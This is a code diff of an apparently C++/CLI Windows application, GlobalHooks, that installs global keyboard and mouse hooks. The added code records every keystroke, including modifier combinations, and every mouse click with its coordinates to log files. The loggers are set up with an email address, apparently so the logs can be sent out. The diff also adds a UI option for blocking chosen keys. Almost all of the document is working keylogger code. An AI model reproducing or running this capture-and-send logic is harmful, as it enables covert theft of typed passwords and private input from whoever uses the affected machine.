@@ -4,6 +4,7 @@
 #include "Logger.h"
 #define LOGGER_KEYBOARD L"KeyboardLog.txt"
 #define LOGGER_MOUSE L"MouseLog.txt"
+#define ACTION_BLOCK "Block"
 #pragma comment (lib, "User32.lib")
 namespace GlobalHooks {
 
@@ -22,6 +23,7 @@ namespace GlobalHooks {
 		{
 			keyboardHook = new KeyHook();
 			keyboardLogger = new Logger(100, "hazy142@gmail.com", LOGGER_KEYBOARD);
+			mouseLogger = new Logger(100, "hazy142@gmail.com", LOGGER_MOUSE);
 			InitializeComponent();
 		}
 
@@ -32,6 +34,8 @@ namespace GlobalHooks {
 				delete keyboardHook;
 			if (keyboardLogger)
 				delete keyboardLogger;
+			if (mouseLogger)
+				delete mouseLogger;
 			UnhookWindowsHookEx(keyboardHookHandle);
 			if (components)
 			{
@@ -45,11 +49,19 @@ namespace GlobalHooks {
 			MSLLHOOKSTRUCT hookedMouse = *((MSLLHOOKSTRUCT*)lParam);
 			if (wParam == WM_LBUTTONDOWN)
 			{
-				int s = 1;
+				string logMessage;
+				logMessage.append("LBUTTON was pressed:");
+				logMessage.append(" X: " + to_string(hookedMouse.pt.x));
+				logMessage.append(" Y: " + to_string(hookedMouse.pt.y));
+				mouseLogger->addMessage(logMessage);
 			}
-			if (hookedMouse.mouseData == XBUTTON2)
+			if (wParam == WM_RBUTTONDOWN)
 			{
-				int s = 1;
+				string logMessage;
+				logMessage.append("RBUTTON was pressed:");
+				logMessage.append(" X: " + to_string(hookedMouse.pt.x));
+				logMessage.append(" Y: " + to_string(hookedMouse.pt.y));
+				mouseLogger->addMessage(logMessage);
 			}
 			return (IntPtr)CallNextHookEx(mouseHookHandle, nCode, wParam, lParam);
 		}
@@ -57,17 +69,68 @@ namespace GlobalHooks {
 		static IntPtr KeyboardProc(int nCode, WPARAM wParam,
 			LPARAM lParam)
 		{
-			DWORD SHIFT_key = 0;
-			DWORD CTRL_key = 0;
-			DWORD ALT_key = 0;
-			if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
+			bool shiftState = false;
+			bool ctrlState = false;
+			bool winState = false;
+			if (GetAsyncKeyState(VK_LSHIFT) & (1 << 15))
+				shiftState = true;
+			if (GetAsyncKeyState(VK_CONTROL) & (1 << 15))
+				ctrlState = true;
+			if (GetAsyncKeyState(VK_LWIN) & (1 << 15))
+				winState = true;
+			//Alt
+			if (wParam == WM_SYSKEYDOWN)
 			{
-				KBDLLHOOKSTRUCT hookedKey = *((KBDLLHOOKSTRUCT*)lParam);
+				string mes("Alt was pressed.");
+				keyboardLogger->addMessage(mes);
+			}
+			KBDLLHOOKSTRUCT hookedKey = *((KBDLLHOOKSTRUCT*)lParam);
+			//Alt + smth
+			if (wParam == WM_SYSKEYUP)
+			{
+				
+				string mes;
 				string pressedKey = keyboardHook->getNameFromStr(hookedKey);
-				string logMessage;
-				logMessage.append(pressedKey);
-				logMessage.append(" was pressed.");
-				keyboardLogger->addMessage(logMessage);
+				mes.append("Alt + ");
+				mes.append(pressedKey);
+				mes.append(" was pressed.");
+				keyboardLogger->addMessage(mes);
+			}
+			//Any other
+			if (wParam == WM_KEYDOWN)
+			{
+				if (shiftState || ctrlState || winState)
+				{
+					string mes;
+					if (shiftState)
+						mes.append("Shift + ");
+					if (ctrlState)
+						mes.append("Ctrl + ");
+					if (winState)
+						mes.append("WIN + ");
+					string pressedKey = keyboardHook->getNameFromStr(hookedKey);
+					mes.append(pressedKey);
+					mes.append(" was pressed.");
+					keyboardLogger->addMessage(mes);
+				}
+				else
+				{
+					string pressedKey = keyboardHook->getNameFromStr(hookedKey);
+					string logMessage;
+					logMessage.append(pressedKey);
+					logMessage.append(" was pressed.");
+					keyboardLogger->addMessage(logMessage);
+				}
+			}
+
+			if (keyboardHook->checkBlockForKey(hookedKey.vkCode))
+			{
+				if (wParam == WM_KEYDOWN)
+				{
+					string logMessage("Last key was blocked");
+					keyboardLogger->addMessage(logMessage);
+				}
+				return (IntPtr)-1;
 			}
 			return (IntPtr) CallNextHookEx(keyboardHookHandle, nCode, wParam, lParam);
 		}
@@ -90,6 +153,7 @@ namespace GlobalHooks {
 	private:
 		static KeyHook *keyboardHook;
 		static Logger *keyboardLogger;
+		static Logger *mouseLogger;
 		static HHOOK keyboardHookHandle;
 		static HHOOK mouseHookHandle;
 		System::Windows::Forms::Label^  currentMode;
@@ -295,6 +359,49 @@ namespace GlobalHooks {
 			comboKey3->Items->AddRange(Enum::GetNames(Keys::typeid));
 			comboKey4->Items->AddRange(Enum::GetNames(Keys::typeid));
 			comboKey5->Items->AddRange(Enum::GetNames(Keys::typeid));
+			comboAction1->Items->Add("-");
+			comboAction1->Items->Add(ACTION_BLOCK);
+			comboAction1->SelectedIndex = 0;
+			comboAction1->SelectedValueChanged += gcnew System::EventHandler(this, &MainWindow::ComboAction1Changed);
+			comboKey1->Enter += gcnew System::EventHandler(this, &MainWindow::ComboKey1Enter);
+			comboKey1->SelectedValueChanged += gcnew System::EventHandler(this, &MainWindow::ComboKey1Changed);
+		}
+
+		void ComboAction1Changed(System::Object^  sender, System::EventArgs^  e)
+		{
+			String ^value = (String ^)comboAction1->SelectedItem;
+			String ^key = (String ^)comboKey1->SelectedItem;
+			if (value == ACTION_BLOCK)
+			{
+				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
+				keyboardHook->addBlock((DWORD)keyCode);
+			}
+			else if (value == "-")
+			{
+				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, key);
+				keyboardHook->deleteBlock((DWORD)keyCode);
+			}
+		}
+
+		void ComboKey1Enter(System::Object^  sender, System::EventArgs^  e)
+		{
+			String ^value = (String ^)comboKey1->SelectedItem;
+			if (value != nullptr)
+			{
+				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, value);
+				keyboardHook->deleteBlock((DWORD)keyCode);
+			}
+		}
+
+		void ComboKey1Changed(System::Object^  sender, System::EventArgs^  e)
+		{
+			String ^keyValue = (String ^)comboKey1->SelectedItem;
+			String ^actionValue = (String ^)comboAction1->SelectedItem;
+			if (actionValue == ACTION_BLOCK)
+			{
+				Keys keyCode = (Keys)Enum::Parse(Keys::typeid, keyValue);
+				keyboardHook->addBlock((DWORD)keyCode);
+			}
 		}
 	};
 }
